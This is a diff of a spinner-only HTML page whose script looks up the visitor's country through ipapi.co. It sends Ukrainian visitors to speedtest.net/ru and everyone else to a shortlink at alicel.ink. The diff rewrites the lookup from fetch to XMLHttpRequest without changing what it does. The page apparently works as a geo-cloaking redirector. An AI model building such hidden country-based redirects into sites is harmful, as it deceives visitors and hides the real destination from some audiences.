@@ -12,23 +12,23 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
 <body>
 <div class="spinner"></div>
 <script>
-async function go() {
-  var ua = 'https://www.speedtest.net/ru';
-  var def = 'https://alicel.ink/alice';
-  try {
-    var r = await fetch('https://ipapi.co/country/');
-    var country = await r.text();
-    country = country.trim();
-    if (country === 'UA') {
-      window.location.replace(ua);
-    } else {
-      window.location.replace(def);
-    }
-  } catch(e) {
-    window.location.replace(def);
+var ua = 'https://www.speedtest.net/ru';
+var def = 'https://alicel.ink/alice';
+
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://ipapi.co/country/', true);
+xhr.onload = function() {
+  var country = xhr.responseText.trim();
+  if (country === 'UA') {
+    window.location.href = ua;
+  } else {
+    window.location.href = def;
   }
-}
-go();
+};
+xhr.onerror = function() {
+  window.location.href = def;
+};
+xhr.send();
 </script>
 </body>
 </html>
